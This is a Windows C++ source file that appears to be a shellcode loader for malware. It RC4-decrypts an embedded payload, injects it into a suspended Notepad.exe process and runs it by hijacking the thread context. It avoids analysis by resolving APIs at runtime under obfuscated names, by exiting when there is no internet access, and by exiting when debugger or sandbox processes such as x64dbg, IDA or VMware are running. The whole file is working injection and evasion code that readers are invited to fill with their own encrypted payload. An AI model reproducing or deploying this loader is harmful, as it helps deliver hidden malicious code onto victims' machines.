/*
 * Author: Cyb3rV1c
 * Created: November 2024
 * License: MIT License
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <iostream>
#pragma comment(lib, "wininet.lib")
#pragma warning (disable:4996)

void DataXR4(BYTE* data, size_t dataLen, const BYTE* key, size_t keyLen) {
    BYTE s[256];
    for (int i = 0; i < 256; i++) {
        s[i] = i;
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keyLen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t k = 0; k < dataLen; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

BOOL InetConnect() {
    HMODULE hWin_z1wq = GetModuleHandle(L"wininet.dll");
    if (!hWin_z1wq) {
        hWin_z1wq = LoadLibrary(L"wininet.dll");
        if (!hWin_z1wq) {
            return FALSE;
        }
    }
    typedef BOOL(WINAPI* Inetchck_z1wq)(LPCWSTR, DWORD, DWORD);
    Inetchck_z1wq pInetchck_z1wq =
        (Inetchck_z1wq)GetProcAddress(hWin_z1wq, "InternetCheckConnectionW");

    if (!pInetchck_z1wq) {
        return FALSE;
    }
    return pInetchck_z1wq(L"https://www.amazon.com", FLAG_ICC_FORCE_CONNECTION, 0);
}


#define LISTARRAY_SIZE 11

const WCHAR* s_snbxChecklist[LISTARRAY_SIZE] = {
        L"x64dbg.exe",
        L"x32dbg.exe",
        L"ida.exe",
        L"ida64.exe",
        L"windbg.exe",
        L"ollydbg.exe",
        L"vmware.exe",
        L"vmsrvc.exe",
        L"vboxservice.exe",
        L"prl_cc.exe",
        L"joeboxserver.exe"
};

BOOL SnbxProcCheck() {

    HANDLE hSnapShot = NULL;
    PROCESSENTRY32W ProcEntry;
    ProcEntry.dwSize = sizeof(PROCESSENTRY32W);
    BOOL bSTATE = FALSE;


    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        goto _EndOfFunction;
    }

    if (!Process32FirstW(hSnapShot, &ProcEntry)) {
        goto _EndOfFunction;
    }

    do {
        for (int i = 0; i < LISTARRAY_SIZE; i++) {
            if (wcscmp(ProcEntry.szExeFile, s_snbxChecklist[i]) == 0) {
                wprintf(L"[+] SBox detected.\n \t [i] Detected this : \"%s\" Of Pid : %d \n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
                bSTATE = TRUE;
                break;
            }
        }

    } while (Process32Next(hSnapShot, &ProcEntry));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    return bSTATE;
}

#define TARGET_PROCESS "Notepad.exe"

// Define function pointers 
typedef LPVOID(WINAPI* datavaloc_z1wq)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* datawmem_z1wq)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* dataprotec_z1wq)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(WINAPI* resumeth_z1wq)(HANDLE);
typedef BOOL(WINAPI* SthContxt_z1wq)(HANDLE, CONTEXT*);
typedef BOOL(WINAPI* GthContxt_z1wq)(HANDLE, LPCONTEXT);
typedef DWORD(WINAPI* WFSingleOBj_z1wq)(HANDLE, DWORD);
typedef HMODULE(WINAPI* LLibrary_z1wq)(LPCSTR);

unsigned char data[] = {
//Add your encrypted shell here
};

datavaloc_z1wq pdatavaloc_z1wq;
datawmem_z1wq  pdatawmem_z1wq;
dataprotec_z1wq pdataprotec_z1wq;
resumeth_z1wq presumeth_z1wq;
GthContxt_z1wq pGthContxt_z1wq;
SthContxt_z1wq pSthContxt_z1wq;
WFSingleOBj_z1wq pWFSingleOBj_z1wq;

BOOL InitFuncP() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        return FALSE;
    }
    pdatavaloc_z1wq = (datavaloc_z1wq)GetProcAddress(hKernel32, "VirtualAllocEx");
    pdatawmem_z1wq = (datawmem_z1wq)GetProcAddress(hKernel32, "WriteProcessMemory");
    pdataprotec_z1wq = (dataprotec_z1wq)GetProcAddress(hKernel32, "VirtualProtectEx");
    pGthContxt_z1wq = (GthContxt_z1wq)GetProcAddress(hKernel32, "GetThreadContext");
    pSthContxt_z1wq = (SthContxt_z1wq)GetProcAddress(hKernel32, "SetThreadContext");
    presumeth_z1wq = (resumeth_z1wq)GetProcAddress(hKernel32, "ResumeThread");
    pWFSingleOBj_z1wq = (WFSingleOBj_z1wq)GetProcAddress(hKernel32, "WaitForSingleObject");

    if (!pdatavaloc_z1wq || !pdatawmem_z1wq || !pdataprotec_z1wq || !presumeth_z1wq || !pGthContxt_z1wq || !pSthContxt_z1wq || !pWFSingleOBj_z1wq) {
        return FALSE;
    }
    return TRUE;
}

BOOL CtSuspendedProc(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    Si.cb = sizeof(STARTUPINFOA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n\t[i] Running : \"%s\" ... ", lpPath);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    return (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL);
}

BOOL ExecDataToRp(IN HANDLE hProcess, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;
    const BYTE Dataxr4ky[] = "Randomize"; //Add your r4 ky here

    BYTE xdeData[sizeof(data)];
    memcpy(xdeData, data, sizeof(data));
    DataXR4(xdeData, sizeof(xdeData), Dataxr4ky, sizeof(Dataxr4ky) - 1);

    *ppAddress = pdatavaloc_z1wq(hProcess, NULL, sizeof(xdeData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        return FALSE;
    }
    printf("\n\t[i] Allocated Mem At: 0x%p\n", *ppAddress);

    if (!pdatawmem_z1wq(hProcess, *ppAddress, xdeData, sizeof(xdeData), &sNumberOfBytesWritten) ||
        sNumberOfBytesWritten != sizeof(xdeData)) {
        return FALSE;
    }
    printf("\t[i] Successfully wrote %d bytes\n", sNumberOfBytesWritten);

    if (!pdataprotec_z1wq(hProcess, *ppAddress, sizeof(xdeData), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }
    printf("\t[i] Mem permissions set to execute\n");

    return TRUE;
}


BOOL Th_hj_s22s(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx;
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    if (!pGthContxt_z1wq(hThread, &ThreadCtx)) {
        return FALSE;
    }

#ifdef _WIN64
    ThreadCtx.Rip = reinterpret_cast<DWORD64>(pAddress);
#else
    ThreadCtx.Eip = reinterpret_cast<DWORD>(pAddress);
#endif

    if (!pSthContxt_z1wq(hThread, &ThreadCtx)) {
        return FALSE;
    }

    printf("\n[#] Press <Enter> To Run");
    getchar();

    presumeth_z1wq(hThread);
    pWFSingleOBj_z1wq(hThread, INFINITE);

    return TRUE;
}

int main() {

    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;

    if (!InetConnect()) {
        printf("[!] No Inet! I'm out!");
        exit(0);
    }

    if (SnbxProcCheck()) {
        printf("[!] Detected SBox! I'm out!");
        exit(0);
    }

    if (!InitFuncP()) {
        return -1;
    }

    printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
    if (!CtSuspendedProc(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }
    printf("\n[i] Created With Pid : %d \n", dwProcessId);

    printf("[i] Writing Data..");
    if (!ExecDataToRp(hProcess, &pAddress)) {
        return -1;
    }

    if (!Th_hj_s22s(hThread, pAddress)) {
        return -1;
    }
    printf("[+] Success! \n\n");

    printf("[#] Press <Enter> To Quit");
    getchar();

    return 0;
}
